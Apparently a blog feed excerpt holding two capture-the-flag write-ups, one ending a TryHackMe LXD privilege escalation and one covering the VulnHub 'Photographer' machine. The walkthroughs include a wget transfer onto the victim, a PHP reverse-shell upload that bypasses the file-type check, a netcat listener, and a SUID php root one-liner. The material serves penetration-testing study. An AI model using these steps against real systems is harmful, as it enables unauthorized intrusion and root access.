&lt;p&gt;Now on to the root flag. Doing the command ‘id’ shows John is part of many groups including ‘sudo’ and ‘lxd’. I tried ‘sudo -l’ but as I don’t have John’s password I cant run any commands as sudo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
john@exploitable:~$ sudo -l
[sudo] password for john: 
Sorry, try again.
[sudo] password for john: 
Sorry, try again.
[sudo] password for john: 
sudo: 3 incorrect password attempts
john@exploitable:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, lxd is interesting. LXD is a Linux container system. Googling ‘lxd privesc’ led me to an &lt;a href=&quot;https://www.hackingarticles.in/lxd-privilege-escalation/&quot;&gt;article&lt;/a&gt; with a overview of LXD, LXC and container technology. Also a step my step guide on how to use LXD to gain root privilege to the host machine.&lt;/p&gt;

&lt;p&gt;First I use git clone to download the alpine builder. Once downloaded I ran the build script.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[✗]─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #git clone  https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 27, done.
remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27
Receiving objects: 100% (27/27), 16.00 KiB | 199.00 KiB/s, done.
Resolving deltas: 100% (6/6), done.
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #cd lxd-alpine-builder
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer/lxd-alpine-builder]
└──╼ #sudo ./build-alpine
Determining the latest release... v3.12
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64
Downloading alpine-mirrors-3.5.10-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading alpine-keys-2.2-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading apk-tools-static-2.10.5-r1.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK
Verified OK
Selecting mirror http://mirror1.hs-esslingen.de/pub/Mirrors/alpine/v3.12/main
fetch http://mirror1.hs-esslingen.de/pub/Mirrors/alpine/v3.12/main/x86_64/APKINDEX.tar.gz
(1/19) Installing musl (1.1.24-r9)
(2/19) Installing busybox (1.31.1-r19)
Executing busybox-1.31.1-r19.post-install
(3/19) Installing alpine-baselayout (3.2.0-r7)
Executing alpine-baselayout-3.2.0-r7.pre-install
Executing alpine-baselayout-3.2.0-r7.post-install
(4/19) Installing openrc (0.42.1-r11)
Executing openrc-0.42.1-r11.post-install
(5/19) Installing alpine-conf (3.9.0-r1)
(6/19) Installing libcrypto1.1 (1.1.1g-r0)
(7/19) Installing libssl1.1 (1.1.1g-r0)
(8/19) Installing ca-certificates-bundle (20191127-r4)
(9/19) Installing libtls-standalone (2.9.1-r1)
(10/19) Installing ssl_client (1.31.1-r19)
(11/19) Installing zlib (1.2.11-r3)
(12/19) Installing apk-tools (2.10.5-r1)
(13/19) Installing busybox-suid (1.31.1-r19)
(14/19) Installing busybox-initscripts (3.2-r2)
Executing busybox-initscripts-3.2-r2.post-install
(15/19) Installing scanelf (1.2.6-r0)
(16/19) Installing musl-utils (1.1.24-r9)
(17/19) Installing libc-utils (0.7.2-r3)
(18/19) Installing alpine-keys (2.2-r0)
(19/19) Installing alpine-base (3.12.0-r0)
Executing busybox-1.31.1-r19.trigger
OK: 8 MiB in 19 packages
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I now have a .tar.gz file I can copy on to the victim machine.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer/lxd-alpine-builder]
└──╼ #ls
alpine-v3.12-x86_64-20200906_1552.tar.gz  build-alpine  LICENSE  README.md
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using Python3 I started a http server.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer/lxd-alpine-builder]
└──╼ #python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Back on the victim machine, I use wget to download the file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;john@exploitable:~$ cd /tmp
john@exploitable:/tmp$ wget http://10.8.21.217/alpine-v3.12-x86_64-20200906_1552.tar.gz
--2020-09-06 14:55:47--  http://10.8.21.217/alpine-v3.12-x86_64-20200906_1552.tar.gz
Connecting to 10.8.21.217:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3109382 (3.0M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20200906_1552.tar.gz’

alpine-v3.12-x86_64-20200906_1552.tar 100%[========================================================================&amp;gt;]   2.96M  1.01MB/s    in 2.9s

2020-09-06 14:55:50 (1.01 MB/s) - ‘alpine-v3.12-x86_64-20200906_1552.tar.gz’ saved [3109382/3109382]

john@exploitable:/tmp$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Still following the steps from the article, I import the image and run, mounting the root file system.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;john@exploitable:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200906_1552.tar.gz --alias myimage
Image imported with fingerprint: 4397c7dce96e22e14f6c108eebaeb629f21273dd5a7791754ad0a082c026b09c
john@exploitable:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | 4397c7dce96e | no     | alpine v3.12 (20200906_15:52) | x86_64 | 2.97MB | Sep 6, 2020 at 2:56pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh
id~ # id
uid=0(root) gid=0(root)
~ # cd /mnt/root/root/
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt 
2e337b8c9f3a
/mnt/root/root # 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We have the root flag! Thank you for reading.&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="oscp" /><summary type="html"></summary></entry><entry><title type="html">Photographer Write Up</title><link href="https://darrynbrownfield.co.uk/photographer" rel="alternate" type="text/html" title="Photographer Write Up" /><published>2020-09-05T00:00:00+00:00</published><updated>2020-09-05T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/photographer</id><content type="html" xml:base="https://darrynbrownfield.co.uk/photographer">&lt;p&gt;&lt;img src=&quot;/assets/images/photographer.png&quot; alt=&quot;Photographer&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;Photographer was the last machine I did before I took my OSCP exam so it seemed fitting for it to be the first write up on my new blog. Photographer was a great OSCP like machine created by &lt;a href=&quot;https://twitter.com/v1n1v131r4&quot;&gt;v1n1v131r4&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;Starting with a Nmap scan lets see what ports are open. I got the IP of the machine by checking the DHCP server on my network. However, I could have used arp-scan to find the IP address.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $nmap -sC -sV -oA nmap/initial 192.168.1.77
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 17:54 BST
Nmap scan report for 192.168.1.77
Host is up (0.0012s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Koken 0.22.24
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2020-09-01T12:54:28-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-01T16:54:28
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The scan reveals 4 ports open, Samba and two web. Based on the HTTP banners it looks to be a Linux Ubuntu machine, Googling apache 2.4.18 ubuntu reveals the OS is probably Ubuntu Xenial 16.04 LTS.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;I started with port 80 but didn’t find anything interesting. I ran Gobuster and Nikto and both came up blank so decided to move on for now. On port 8000 I’m presented with a CMS type page. Looking at the footer indicates ‘Built with Koken’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/Port-8000.png&quot; alt=&quot;Port 8000&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A quick Google shows &lt;a href=&quot;http://koken.me/&quot;&gt;Koken&lt;/a&gt; is a CMS for photographers. An &lt;a href=&quot;https://www.exploit-db.com/exploits/48706&quot;&gt;exploit&lt;/a&gt; is also available by the same author of the machine which would indicate this is the intend path. However, the exploit requires authentication.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/exploit.png&quot; alt=&quot;Exploit&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the exploit, the POST request makes a call to &lt;strong&gt;/admin/&lt;/strong&gt;. Going to the URL does provide a login page requiring a email address and password. I will take a look at Samba before going any further on the web ports.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/login.png&quot; alt=&quot;Login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using smbclient and logging in anonymously shows one share in particular that looks interesting ‘sambashare’.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $smbclient -L \\\\192.168.1.77\\

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $smbclient \\\\192.168.1.77\\sambashare\\
Enter WORKGROUP\daz\'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Tue Jul 21 02:30:07 2020
  ..                                  D        0  Tue Jul 21 10:44:25 2020
  mailsent.txt                        N      503  Tue Jul 21 02:29:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 02:22:23 2020

                278627392 blocks of size 1024. 264268400 blocks available
smb: \&amp;gt; mget *
Get file mailsent.txt? y
getting file \mailsent.txt of size 503 as mailsent.txt (245.6 KiloBytes/sec) (average 245.6 KiloBytes/sec)
Get file wordpress.bkp.zip? y
getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (67013.8 KiloBytes/sec) (average 66362.5 KiloBytes/sec)
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Two files are on the share, the first is an email from Agi to Daisa advising the site is ready and the other file appears to be a backup zip of the site.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $cat mailsent.txt 
Message-ID: &amp;lt;4129F3CA.2020509@dc.edu&amp;gt;
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence &amp;lt;agi@photographer.com&amp;gt;
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi &amp;lt;daisa@photographer.com&amp;gt;
Subject: To Do - Daisa Website\'s
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don\'t forget your secret, my babygirl ;)
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;‘babygirl’ looks to be a hint to the password and I now have 2 users and email addresses:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Agi Clarence - agi@photographer.com&lt;/li&gt;
  &lt;li&gt;Daisa Ahomi - daisa@photographer.com&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;foot-hold&quot;&gt;Foot hold&lt;/h3&gt;

&lt;p&gt;I go back to port &lt;strong&gt;8000/admin/&lt;/strong&gt; and try them out. I get straight in with &lt;strong&gt;daisa@photographer.com&lt;/strong&gt; and &lt;strong&gt;babygirl&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/cms.png&quot; alt=&quot;CMS&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Going back to the exploit from earlier, it looks like I can upload a PHP file by saving the file as .jpg then use Burp to rename it. Im going to try and upload a reverse shell PHP script. If your using Kali or ParrotOS the script can be found in /usr/share/webshells/php/ or downloaded from &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;pentestmonkey&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $mv php-reverse-shell.php shell.php.jpg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I update the script with my local IP and port details.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Start a netcat listener ready to catch the shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $sudo nc -nvlp 443
listening on [any] 443 ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Going back to the admin page I upload the file using ‘Import content’ and find the PHP file. With Burp open and proxy intercept on I set Burp as a proxy in my browser and select ‘Import’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/content.png&quot; alt=&quot;Content&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In Burp I can now remove the .jpg extension from the file and forward the request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/burp.png&quot; alt=&quot;Burp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With the file selected, right clicking on ‘Download File’ and ‘Open Link in New Tab’ should run out PHP script.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/downloadfile.png&quot; alt=&quot;DownloadFile&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I have a shell as www-data! First thing I always do is upgrade it to a more stable TTY using Python.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/shell.png&quot; alt=&quot;Shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first flag can be found in Daisa’s user directory.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@photographer:/$ cd home/daisa/
www-data@photographer:/home/daisa$ ls
Desktop    Downloads  Pictures  Templates  examples.desktop
Documents  Music      Public    Videos     user.txt
www-data@photographer:/home/daisa$ cat user.txt 
d41d8cd98f00{REDACTED}
www-data@photographer:/home/daisa$
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h3&gt;

&lt;p&gt;I now need to escalate out of www-data to either a user or root. Im going to use &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite&quot;&gt;linpeas&lt;/a&gt; to enumerate the machine for possible local privilege escalation paths. First I will use Python to copy the script from my machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/linpeas.png&quot; alt=&quot;linpeas&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Linpeas provides a lot of output, looking through the output &lt;strong&gt;/usr/bin/php7.2&lt;/strong&gt; jumps out.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Linpeas will colour code the output based on severity but notice /usr/bin/php7.2 is green. Its important to review all the output and not rely on the scripts/tools to identify potential attack vectors.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/suid.png&quot; alt=&quot;suid&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First I will check &lt;a href=&quot;https://gtfobins.github.io&quot;&gt;GTFOBins&lt;/a&gt;, searching PHP.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/photographer/phpsuid.png&quot; alt=&quot;gtfobins&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lets give it a go.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@photographer:/tmp$ CMD=&quot;/bin/sh&quot;
www-data@photographer:/tmp$ /usr/bin/php7.2 -r &quot;pcntl_exec('/bin/sh', ['-p']);&quot;
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
root
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We have root! Lets grab the flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# 
# cd /root
# cat proof.txt
                                                                
                                .:/://::::///:-`                
                            -/++:+`:--:o:  oo.-/+/:`            
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`         
                       :o:``oyo/o`. `      ```/-so:+--+/`       
                     -o:-`yh//.                 `./ys/-.o/      
                    ++.-ys/:/y-                  /s-:/+/:/o`    
                   o/ :yo-:hNN                   .MNs./+o--s`   
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s   
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/  
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h  
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s. 
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +- 
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o. 
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h` 
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o  
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`  
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-   
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.    
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`     
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-       
                        ./+:`:yh:dso/.+-++++ss+h++.:++-         
                           -/+/-:-/y+/d:yh-o:+--/+/:`           
                              `-///////////////:`               
                                                                

Follow me at: http://v1n1v131r4.com


d41d8cd98f00{REDACTED}
#
&lt;/code&gt;&lt;/pre&gt;</content><author><name>Darryn</name></author><category term="vulnhub" /><category term="ctf" /><category term="oscp" /><summary type="html"></summary></entry></feed>